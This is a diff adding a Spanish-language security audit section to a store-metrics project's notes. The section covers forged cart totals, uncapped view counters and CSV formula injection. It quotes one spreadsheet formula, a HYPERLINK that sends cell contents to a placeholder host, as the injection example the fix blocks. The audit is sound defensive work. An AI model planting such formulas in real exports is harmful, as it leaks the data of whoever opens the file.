@@ -676,6 +676,79 @@ Las 114 visitas de producción, misma tienda: 7 días → 13, 30 → 47, 90 → 
 
 ---
 
+## ✅ 13. Auditoría de cierre (10/08/2026)
+
+Pedido de Flavio antes de deployar: *"buscando bug, errores, códigos fantasmas, input, que no puedan
+meter bot o virus o código malicioso y nos arruine las métricas"*.
+
+### 🔴 Lo que un desconocido podía hacer
+
+**El monto de un carrito abandonado lo mandaba el navegador y nadie lo miraba.** `cart/track` hacía
+`total: Number(body.total) || 0`. Cualquiera con la consola abierta anotaba un carrito de
+$999.999.999, y eso no es un número feo y nada más:
+
+- entra en el **"monto sin recuperar"** de Métricas;
+- ordena la lista de **"Para revisar"** del resumen, que se ordena por plata en juego — o sea que el
+  carrito forjado se llevaba el primer puesto y tapaba lo real;
+- le manda a la dueña una **campanita** diciendo que alguien dejó esa fortuna sin comprar.
+
+Ahora se recorren los productos **de esa tienda** y se arma el máximo plausible (el precio más caro
+entre el del producto y el de sus variantes, por la cantidad), y el total del cliente se recorta
+contra ese techo. Un ítem con un `productId` que no es de la tienda **no suma nada**, así que el
+carrito armado a mano con IDs inventados queda en cero solo.
+
+> Se **recorta** en vez de reemplazar a propósito: el precio real puede ser menor por promos,
+> escalones o mayorista, y esas reglas viven en el checkout. Recalcular acá sería una sexta copia de
+> esa cuenta. El techo no necesita estar sincronizado para servir — sólo tiene que ser un techo.
+
+**El contador de vistas de producto no tenía NINGÚN tope.** `product-view` validaba bien que el
+producto fuera de esa tienda, y después dejaba subir `viewCount` en un bucle. `viewCount` es lo que
+ordena **"Lo más visto"** en la vidriera, así que cualquiera podía poner el producto que quisiera
+arriba de todo en una tienda ajena. Ahora pasa por `visitaLegitima` (60/hora por IP).
+
+**`cart/track` estaba abierto de par en par:** sin filtro de origen, con 20 por **minuto** (1.200 por
+hora), `req.json()` sin `catch` —un cuerpo mal formado era un 500 sin manejar—, `items` sin tope, los
+textos sin tope, y la tienda buscada sin mirar si estaba activa. Todo corregido.
+
+### 🔴 Inyección de fórmulas en el CSV
+
+`csv()` escapaba comas y comillas, pero una celda que arranca con `=`, `+`, `-`, `@`, tab o retorno
+**no es texto para Excel ni para Sheets: es una fórmula, y la ejecutan al abrir el archivo**. Una promo
+llamada `=HYPERLINK("http://x.com?"&A1,"Ver")` se convierte en un link que se lleva los datos de la
+planilla.
+
+Las comillas **no alcanzan** —`"=1+1"` sigue siendo fórmula—; lo que corta es un apóstrofo adelante.
+Acá los nombres los escribe la dueña, o sea que se lo haría a sí misma, pero estos archivos se mandan
+por mail al contador y el que lo abre no tiene por qué comerse eso.
+
+`csv-seguro.check.ts` tiene 21 chequeos y uno especial: **compara su copia de la función contra la de
+la ruta de export, carácter por carácter**, para que no se pueda tocar una sin la otra.
+
+### 🟡 Un riesgo que trajo el propio arreglo
+
+La lista de `lib/bots` incluye **`"whatsapp"`**, para frenar al que busca la vista previa del link. No
+hay forma de distinguirlo con certeza del navegador que WhatsApp abre adentro de la app.
+
+En una métrica, equivocarse cuesta una visita mal contada. En `cart/track`, equivocarse **cuesta una
+venta**: no se guarda el carrito, no sale el recordatorio, y nadie se entera nunca. Con esa asimetría,
+ahí conviene contar de más — así que ese endpoint mantiene origen y tope por IP pero **no filtra por
+User-Agent**. Lo que frena el abuso de verdad no es el UA, que se falsifica escribiendo una línea.
+
+### ✅ Lo que se revisó y está bien
+
+| | |
+|---|---|
+| `store-views` / `store-funnel` | Bots, origen propio, tope por IP, y el valor validado contra una **lista cerrada antes** de tocar la base |
+| XSS | Ni un `dangerouslySetInnerHTML` en toda el área. React escapa solo |
+| Código fantasma | eslint `no-unused-vars` limpio; `RANGE_OPTIONS` y `RANGE_LABELS` no dejaron restos |
+| Doble clic | CSV y Compartir tienen `disabled` + salida temprana; el PDF es `window.print()` (lo maneja el navegador); el panel de fechas se cierra al aplicar |
+| Entrada de la URL | Todo pasa por `resolverRango` (55 chequeos): fechas contra el calendario real, rangos recortados, basura al preset con aviso a la vista |
+| Texto ajeno | **Ningún texto que escriba un comprador llega a Métricas ni al CSV.** Todo lo que pasa por `csv()` lo escribió la dueña o es una constante |
+| SQL | Prisma en todo el camino, parametrizado. Nada de SQL crudo |
+| Escrituras públicas | Las 24 rutas que escriben sin sesión tienen `getOwnerStore()`, `CRON_SECRET`, webhook firmado o tope por IP |
+
+---
+
 ## Cómo correr los chequeos
 
 ```
@@ -687,5 +760,6 @@ npx tsx src/lib/origen-visita.check.ts
 npx tsx src/lib/embudo.check.ts
 npx tsx src/lib/clientes.check.ts
 npx tsx src/lib/rango-fechas.check.ts
+npx tsx src/lib/csv-seguro.check.ts
 npx tsx src/lib/bots.check.ts
 ```
